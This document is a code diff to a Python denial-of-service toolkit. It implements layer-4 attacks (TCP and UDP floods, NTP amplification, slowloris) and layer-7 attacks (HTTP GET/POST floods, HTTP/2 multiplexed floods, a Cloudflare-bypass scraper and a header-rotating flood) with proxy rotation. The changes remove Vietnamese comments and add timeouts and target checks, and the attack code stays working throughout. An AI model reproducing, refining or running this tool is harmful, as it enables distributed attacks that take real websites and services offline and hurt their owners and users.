@@ -16,7 +16,7 @@ class AttackBase:
         self.method = method.upper()
         self.proxies = list(proxies) if proxies else []
         self.duration = duration
-        self.threads = min(threads, psutil.cpu_count() * 50)  # Giảm threads để tránh crash
+        self.threads = min(threads, psutil.cpu_count() * 50)
         self.bytes_sent = 0
         self.requests_sent = 0
         self.running = False
@@ -28,13 +28,12 @@ class AttackBase:
         proxy = random.choice(self.proxies) if self.proxies else None
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        sock.settimeout(0.5)  # Timeout hợp lý
+        sock.settimeout(0.5)
         if ssl_enabled and not proxy:
             sock = ssl.wrap_socket(sock)
         return sock, proxy
 
     async def check_resources(self):
-        """Kiểm tra và tự hủy nếu tài nguyên vượt ngưỡng"""
         if not check_system_resources():
             logger.warning("System resources exceeded threshold. Stopping attack.")
             self.running = False
@@ -43,7 +42,12 @@ class Layer4Attack(AttackBase):
     async def run(self):
         self.running = True
         self.start_time = time()
+        end_time = self.start_time + self.duration
         if isinstance(self.target, str):
+            if "http" in self.target.lower():
+                logger.error(f"Method {self.method} requires IP:port, not URL. Stopping attack.")
+                self.running = False
+                return
             host, port = self.target.split(":")
             self.target = (socket.gethostbyname(host), int(port))
         methods = {
@@ -54,7 +58,7 @@ class Layer4Attack(AttackBase):
         }
         if self.method in methods:
             tasks = [asyncio.create_task(methods[self.method]()) for _ in range(self.threads)]
-            await asyncio.wait(tasks)
+            await asyncio.wait(tasks, timeout=self.duration)
         else:
             logger.error(f"Method {self.method} not supported.")
         self.running = False
@@ -64,19 +68,19 @@ class Layer4Attack(AttackBase):
             sock, proxy = self.get_socket()
             target = (proxy.ip, proxy.port) if proxy else self.target
             sock.connect(target)
-            payload = randbytes(4096)  # Giảm payload để ổn định
+            payload = randbytes(4096)
             while self.running:
                 await self.check_resources()
                 sent = sock.send(payload)
                 self.bytes_sent += sent
                 self.requests_sent += 1
-                await asyncio.sleep(0.01)  # Delay hợp lý
+                await asyncio.sleep(0.01)
             sock.close()
 
     async def udp_flood(self):
         with suppress(Exception):
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payload = randbytes(4096) + b'\x00' * (random.randint(0, 1024))  # Fragmentation
+            payload = randbytes(4096) + b'\x00' * (random.randint(0, 1024))
             while self.running:
                 await self.check_resources()
                 sent = sock.sendto(payload, self.target)
@@ -86,7 +90,7 @@ class Layer4Attack(AttackBase):
             sock.close()
 
     async def ntp_amplification(self):
-        payload = b'\x17\x00\x03\x2a' + randbytes(32)  # Payload amplification vừa phải
+        payload = b'\x17\x00\x03\x2a' + randbytes(32)
         with suppress(Exception):
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             while self.running:
@@ -100,7 +104,7 @@ class Layer4Attack(AttackBase):
     async def slowloris(self):
         sockets = []
         with suppress(Exception):
-            for _ in range(min(self.threads, 200)):  # Giảm số kết nối để ổn định
+            for _ in range(min(self.threads, 200)):
                 sock, proxy = self.get_socket()
                 target = (proxy.ip, proxy.port) if proxy else self.target
                 sock.connect(target)
@@ -110,17 +114,18 @@ class Layer4Attack(AttackBase):
                 await self.check_resources()
                 for sock in sockets[:]:
                     try:
-                        sock.send(b"X-a: " + randbytes(16) + b"\r\n")  # Payload nhỏ hơn
+                        sock.send(b"X-a: " + randbytes(16) + b"\r\n")
                         self.bytes_sent += 18
                         self.requests_sent += 1
                     except:
                         sockets.remove(sock)
-                await asyncio.sleep(0.5)  # Delay hợp lý
+                await asyncio.sleep(0.5)
 
 class Layer7Attack(AttackBase):
     async def run(self):
         self.running = True
         self.start_time = time()
+        end_time = self.start_time + self.duration
         self.parsed = urlparse(self.target)
         self.host = self.parsed.hostname
         self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
@@ -133,7 +138,7 @@ class Layer7Attack(AttackBase):
         }
         if self.method in methods:
             tasks = [asyncio.create_task(methods[self.method]()) for _ in range(self.threads)]
-            await asyncio.wait(tasks)
+            await asyncio.wait(tasks, timeout=self.duration)
         else:
             logger.error(f"Method {self.method} not supported.")
         self.running = False
@@ -146,7 +151,7 @@ class Layer7Attack(AttackBase):
             "Accept": "text/html,application/xhtml+xml,*/*",
             "Cache-Control": "no-cache",
             "Connection": "keep-alive",
-            "X-Custom": randbytes(64).hex()  # Headers vừa phải
+            "X-Custom": randbytes(64).hex()
         }
         with suppress(Exception):
             sock, proxy = self.get_socket(self.parsed.scheme == "https")
@@ -159,7 +164,7 @@ class Layer7Attack(AttackBase):
                 sent = sock.send(payload.encode())
                 self.bytes_sent += sent
                 self.requests_sent += 1
-                await asyncio.sleep(0.02)  # Delay hợp lý
+                await asyncio.sleep(0.02)
             sock.close()
 
     async def http_post(self):
@@ -176,7 +181,7 @@ class Layer7Attack(AttackBase):
             sock.connect(target)
             payload = f"POST {self.parsed.path or '/'} HTTP/1.1\r\nHost: {self.host}\r\n" + \
                       "\r\n".join(f"{k}: {v}" for k, v in headers.items()) + \
-                      f"\r\nContent-Length: 8192\r\n\r\n{randbytes(8192).decode('latin1')}"  # Payload ổn định
+                      f"\r\nContent-Length: 8192\r\n\r\n{randbytes(8192).decode('latin1')}"
             while self.running:
                 await self.check_resources()
                 sent = sock.send(payload.encode())
@@ -193,13 +198,13 @@ class Layer7Attack(AttackBase):
             ":authority": self.host,
             "Referer": random.choice(self.referers),
             "Accept-Encoding": "gzip, deflate, br",
-            "X-Custom": randbytes(128).hex()  # Headers vừa phải
+            "X-Custom": randbytes(128).hex()
         }
         with suppress(Exception):
             proxy = random.choice(self.proxies) if self.proxies else None
             proxy_url = f"http://{proxy}" if proxy else None
             async with aiohttp.ClientSession() as session:
-                tasks = [session.get(self.target, headers=headers, proxy=proxy_url) for _ in range(5)]  # Giảm multiplexing để ổn định
+                tasks = [session.get(self.target, headers=headers, proxy=proxy_url) for _ in range(5)]
                 while self.running:
                     await self.check_resources()
                     responses = await asyncio.gather(*tasks, return_exceptions=True)
@@ -208,7 +213,7 @@ class Layer7Attack(AttackBase):
                             data = await resp.read()
                             self.bytes_sent += len(data)
                             self.requests_sent += 1
-                    await asyncio.sleep(0.01)  # Delay hợp lý
+                    await asyncio.sleep(0.01)
 
     async def cloudflare_bypass(self):
         with suppress(Exception):
@@ -225,10 +230,9 @@ class Layer7Attack(AttackBase):
                 resp = scraper.get(self.target, headers=headers, proxies=proxy_dict)
                 self.bytes_sent += len(resp.request.body or b"") + len(resp.content)
                 self.requests_sent += 1
-                await asyncio.sleep(0.05)  # Delay hợp lý
+                await asyncio.sleep(0.05)
 
     async def flood_attack(self):
-        # Phương thức nâng cấp: HTTP Flood với Dynamic Header Rotation và Stream Overloading
         with suppress(Exception):
             async with aiohttp.ClientSession() as session:
                 while self.running:
@@ -241,13 +245,13 @@ class Layer7Attack(AttackBase):
                         "Cache-Control": "no-cache",
                         "Connection": "keep-alive",
                         "X-Request-ID": ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=32)),
-                        "X-Custom-Header": randbytes(256).hex()  # Headers vừa phải
+                        "X-Custom-Header": randbytes(256).hex()
                     }
                     proxy = random.choice(self.proxies) if self.proxies else None
                     proxy_url = f"http://{proxy}" if proxy else None
                     tasks = [
                         session.get(self.target, headers=headers, proxy=proxy_url),
-                        session.post(self.target, headers=headers, data=randbytes(16384), proxy=proxy_url),  # Payload ổn định
+                        session.post(self.target, headers=headers, data=randbytes(16384), proxy=proxy_url),
                         session.head(self.target, headers=headers, proxy=proxy_url)
                     ]
                     responses = await asyncio.gather(*tasks, return_exceptions=True)
@@ -256,4 +260,4 @@ class Layer7Attack(AttackBase):
                             data = await resp.read()
                             self.bytes_sent += len(data)
                             self.requests_sent += 1
-                    await asyncio.sleep(0.005)  # Delay tối ưu
+                    await asyncio.sleep(0.005)
